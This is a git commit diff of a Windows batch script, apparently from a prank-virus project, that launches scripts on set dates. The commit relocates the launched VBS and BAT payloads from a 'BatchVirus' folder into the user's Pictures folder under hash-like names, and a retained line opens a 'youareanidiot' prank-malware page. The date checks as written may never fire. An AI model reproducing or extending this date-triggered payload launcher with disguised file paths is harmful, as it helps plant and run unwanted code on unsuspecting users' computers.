0194f7b10d54ab00d812a65c891501e0467acb05
FaZeMelon <ryanmonkills6@gmail.com>
2017-04-01 00:47:04 +0200

    Update FileScheduler.bat

--- scripts/FileScheduler.bat
+++ scripts/FileScheduler.bat
@@ -1,4 +1,4 @@
 @echo off
-if %date% == "3/17/2017" start "" "C:\Users\%USERNAME%\Desktop\BatchVirus\d3745b53b599b72e9cb750f4d757560d.vbs"
+if %date% == "3/17/2017" start "" "C:\Users\%USERNAME%\Pictures\d3745b53b599b72e9cb750f4d757560d.bat"
 if %date% == "4/7/2004" start "" "http://curseddreams.me//youareanidiot.org.html"
-if %date% == "3/16/2017" start "" "C:\Users\%USERNAME%\Desktop\BatchVirus\DankMemes.vbs"
+if %date% == "3/16/2017" start "" "C:\Users\%USERNAME%\Pictures\7b96332f2c9f777574ba038be0334018.vbs"
